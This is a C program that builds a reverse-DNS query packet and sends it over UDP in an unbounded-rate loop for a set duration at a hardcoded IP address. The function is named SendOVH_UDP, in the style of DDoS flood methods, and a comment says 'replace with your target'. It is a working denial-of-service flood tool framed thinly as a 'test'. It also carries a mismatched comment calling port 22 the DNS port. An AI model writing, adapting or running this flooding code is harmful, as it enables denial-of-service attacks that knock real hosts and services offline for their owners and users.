#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

// Function to convert an IP address to reverse DNS lookup format
void ip_to_reverse_dns(const char *ip, char *buffer) {
    int octets[4];
    // Parse the IP address into its four octets
    sscanf(ip, "%d.%d.%d.%d", &octets[3], &octets[2], &octets[1], &octets[0]);
    // Format the reverse DNS lookup string
    sprintf(buffer, "%d.%d.%d.%d.in-addr.arpa", octets[0], octets[1], octets[2], octets[3]);
}

// Modify create_dns_query to accept an IP address for reverse DNS lookup
void create_dns_query(const char *reverse_dns, uint8_t *buffer, size_t *length) {
    uint8_t header[] = {
        0xAB, 0xCD, // Transaction ID
        0x01, 0x00, // Flags
        0x00, 0x01, // Questions
        0x00, 0x00, // Answer RRs
        0x00, 0x00, // Authority RRs
        0x00, 0x00, // Additional RRs
    };
    uint8_t footer[] = {
        0x00, // End of the QNAME
        0x00, 0x0C, // Type: PTR
        0x00, 0x01  // Class: IN
    };
    // Copy header
    memcpy(buffer, header, sizeof(header));
    int position = sizeof(header);

    // Convert reverse DNS string to DNS query format and append
    for (const char *token = strtok((char *)reverse_dns, "."); token != NULL; token = strtok(NULL, ".")) {
        size_t len = strlen(token);
        buffer[position++] = (uint8_t)len;
        memcpy(&buffer[position], token, len);
        position += len;
    }

    // Copy footer
    memcpy(&buffer[position], footer, sizeof(footer));
    position += sizeof(footer);

    *length = position;
}

void SendOVH_UDP(char *host, int port, int duration, int intensity, const char *ip) {
    int sockfd, i;
    long end = time(NULL) + duration;
    struct sockaddr_in servaddr;
    uint8_t packet[1024]; // Adjusted for the DNS query packet
    size_t packet_length;

    char reverse_dns[256];
    ip_to_reverse_dns(ip, reverse_dns); // Convert IP to reverse DNS format
    create_dns_query(reverse_dns, packet, &packet_length); // Create DNS query packet

    // UDP socket creation
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    inet_pton(AF_INET, host, &servaddr.sin_addr);

    // Send DNS query packets in a loop
    while (end > time(NULL)) {
        for (i = 0; i < intensity; i++) {
            sendto(sockfd, packet, packet_length, 0, (const struct sockaddr *)&servaddr, sizeof(servaddr));
        }
    }

    close(sockfd);
}

int main() {
    char *targetHost = "159.203.76.29"; // Example DNS server IP, replace with your target
    int targetPort = 22; // DNS port
    int testDuration = 100; // Duration of the test in seconds
    int testIntensity = 1472; // Number of packets sent in each loop iteration
    char *ipToQuery = "159.203.76.29"; // The IP address for reverse DNS lookup

    SendOVH_UDP(targetHost, targetPort, testDuration, testIntensity, ipToQuery);

    return 0;
}
